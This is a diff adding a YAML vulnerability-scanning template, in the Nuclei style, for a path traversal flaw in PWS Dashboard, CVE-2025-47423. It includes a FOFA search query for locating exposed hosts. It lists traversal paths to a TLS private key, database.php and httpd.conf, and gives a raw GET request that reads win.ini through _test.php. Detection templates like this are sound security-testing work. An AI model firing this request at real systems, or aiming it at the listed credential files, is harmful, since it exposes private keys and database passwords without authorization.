@@ -1,0 +1,33 @@
+id: pws-dashboard-lfi-windows
+
+info:
+  name: "PWS Dashboard 路径遍历导致敏感数据泄露漏洞"
+  author: 0dayPoc
+  severity: medium
+  description: |-
+    fofa: title="PWS Dashboard"
+          PWS Dashboard 存在路径遍历诱导敏感数据暴露风险，攻击者可通过构造恶意路径请求获取系统关键配置及凭证信息。潜在可访问路径包括：
+          ../../../apache/conf/ssl.key/server.key
+      ../../../config/database.php
+      ../../../../Program Files/Apache Group/Apache/conf/httpd.conf
+  reference:
+  - CVE-2025-47423
+  tags: PWS
+
+http:
+- raw:
+  - |
+    GET /others/_test.php?test=../../../../windows/win.ini HTTP/1.1
+    Host: {{Hostname}}
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+    Accept-Language: en-US,en;q=0.5
+    Accept-Encoding: gzip, deflate
+    Connection: close
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: body
+    words:
+    - "for 16-bit app support"
